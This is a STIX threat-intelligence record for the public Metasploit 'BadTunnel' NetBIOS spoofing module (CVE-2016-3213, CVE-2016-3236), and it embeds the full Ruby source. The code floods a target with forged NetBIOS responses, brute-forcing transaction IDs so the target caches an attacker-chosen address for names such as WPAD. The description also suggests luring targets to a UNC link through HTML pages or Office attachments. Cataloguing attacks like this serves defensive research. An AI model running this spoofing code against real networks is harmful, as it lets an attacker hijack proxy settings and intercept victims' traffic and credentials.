{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6508aab-b022-44af-a3f9-1f56fd29d330",
    "created": "2024-08-14T16:21:47.86658Z",
    "modified": "2024-08-14T16:21:47.866584Z",
    "name": "NetBIOS Response \"BadTunnel\" Brute Force Spoof (NAT Tunnel)",
    "description": " This module listens for a NetBIOS name request and then continuously spams NetBIOS responses to a target for given hostname, causing the target to cache a malicious address for this name. On high-speed networks, the PPSRATE value should be increased to speed up this attack. As an example, a value of around 30,000 is almost 100% successful when spoofing a response for a 'WPAD' lookup. Distant targets may require more time and lower rates for a successful attack.  This module works when the target is behind a NAT gateway, since the stream of NetBIOS responses will keep the NAT mapping alive after the initial setup. To trigger the initial NetBIOS request to the Metasploit system, force the target to access a UNC link pointing to the same address (HTML, Office attachment, etc).  This NAT-piercing issue was named the 'BadTunnel' vulnerability by the discoverer Yu Yang (@tombkeeper). The Microsoft patches (MS16-063/MS16-077) impact the way that the proxy host (WPAD) host is identified, but do change the predictability of NetBIOS requests.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/netbios_spoof_nat.rb",
            "external_id": "netbios_spoof_nat.rb"
        },
        {
            "source_name": "reference",
            "url": "http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3213"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3236"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  def initialize\n    super(\n      'Name'        => 'NetBIOS Response \"BadTunnel\" Brute Force Spoof (NAT Tunnel)',\n      'Description'    => %q{\n          This module listens for a NetBIOS name request and then continuously spams\n        NetBIOS responses to a target for given hostname, causing the target to cache\n        a malicious address for this name. On high-speed networks, the PPSRATE value\n        should be increased to speed up this attack. As an example, a value of around\n        30,000 is almost 100% successful when spoofing a response for a 'WPAD' lookup.\n        Distant targets may require more time and lower rates for a successful attack.\n\n        This module works when the target is behind a NAT gateway, since the stream of\n        NetBIOS responses will keep the NAT mapping alive after the initial setup. To\n        trigger the initial NetBIOS request to the Metasploit system, force the target\n        to access a UNC link pointing to the same address (HTML, Office attachment, etc).\n\n        This NAT-piercing issue was named the 'BadTunnel' vulnerability by the discoverer,\n        Yu Yang (@tombkeeper). The Microsoft patches (MS16-063/MS16-077) impact the way\n        that the proxy host (WPAD) host is identified, but do change the predictability\n        of NetBIOS requests.\n\n      },\n      'Author'     => [\n        'vvalien',   # Metasploit Module (post)\n        'hdm',       # Metasploit Module\n        'tombkeeper' # Vulnerability Discovery\n      ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run listener for NetBIOS requests and respond to them' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service',\n      'References'     =>\n        [\n          ['URL', 'http://xlab.tencent.com/en/2016/06/17/BadTunnel-A-New-Hope/'],\n          ['CVE', '2016-3213'],\n          ['MSB', 'MS16-063'],\n          ['CVE', '2016-3236'],\n          ['MSB', 'MS16-077']\n        ],\n      'DisclosureDate' => 'Jun 14 2016'\n    )\n\n    register_options(\n      [\n        OptAddress.new('SRVHOST',   [ true, \"The local host to listen on.\", '0.0.0.0' ]),\n        OptPort.new('SRVPORT',      [ true, \"The local port to listen on.\", 137 ]),\n        OptString.new('NBNAME',     [ true, \"The NetBIOS name to spoof a reply for\", 'WPAD' ]),\n        OptAddress.new('NBADDR',    [ true, \"The address that the NetBIOS name should resolve to\", Rex::Socket.source_address(\"50.50.50.50\") ]),\n        OptInt.new('PPSRATE',       [ true, \"The rate at which to send NetBIOS replies\", 1_000])\n      ])\n  end\n\n  def netbios_service\n    @port = datastore['SRVPORT'].to_i\n\n    # MacOS X workaround\n    ::Socket.do_not_reverse_lookup = true\n\n    @sock = ::UDPSocket.new()\n    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)\n    @sock.bind(datastore['SRVHOST'], @port)\n\n    @targ_rate = datastore['PPSRATE']\n    @fake_name = datastore['NBNAME']\n    @fake_addr = datastore['NBADDR']\n\n    print_status(\"Listening for NetBIOS requests...\")\n\n    begin\n      loop do\n        packet, addr = @sock.recvfrom(65535)\n        next if packet.length == 0\n\n        @targ_addr = addr[3]\n        @targ_port = addr[1]\n        break\n      end\n\n      # TODO: Seed our counter based on the TXID of this request\n      print_status(\"Received a NetBIOS request from #{@targ_addr}:#{@targ_port}\")\n      @sock.connect(@targ_addr, @targ_port)\n\n      netbios_spam\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Error #{e.class} #{e} #{e.backtrace}\")\n    ensure\n      @sock.close if @sock\n    end\n  end\n\n  def netbios_spam\n    payload =\n        \"\\xff\\xff\"   + # TX ID (will brute force this)\n        \"\\x85\\x00\"   + # Flags = response + authoratative + recursion desired\n        \"\\x00\\x00\"   + # Questions = 0\n        \"\\x00\\x01\"   + # Answer RRs = 1\n        \"\\x00\\x00\"   + # Authority RRs = 0\n        \"\\x00\\x00\"   + # Additional RRs = 0\n        \"\\x20\"       +\n        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack(\"A15\") + \"\\x00\" ) +\n        \"\\x00\"       +\n        \"\\x00\\x20\"   + # Type = NB\n        \"\\x00\\x01\"   + # Class = IN\n        \"\\x00\\x04\\x93\\xe0\" + # TTL long time\n        \"\\x00\\x06\"   + # Datalength = 6\n        \"\\x00\\x00\"   + # Flags B-node, unique\n        Rex::Socket.addr_aton(@fake_addr)\n\n    stime = Time.now.to_f\n    pcnt = 0\n    pps  = 0\n\n    print_status(\"Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...\")\n\n    live = true\n    while live\n      0.upto(65535) do |txid|\n        begin\n          payload[0,2] = [txid].pack(\"n\")\n          @sock.write(payload)\n          pcnt += 1\n\n          pps = (pcnt / (Time.now.to_f - stime)).to_i\n          if pps > @targ_rate\n            sleep(0.01)\n          end\n        rescue Errno::ECONNREFUSED\n          print_error(\"Error: Target sent us an ICMP port unreachable, port is likely closed\")\n          live = false\n          break\n        end\n      end\n    end\n  end\n\n  def run\n    loop { netbios_service }\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 14 2016"
}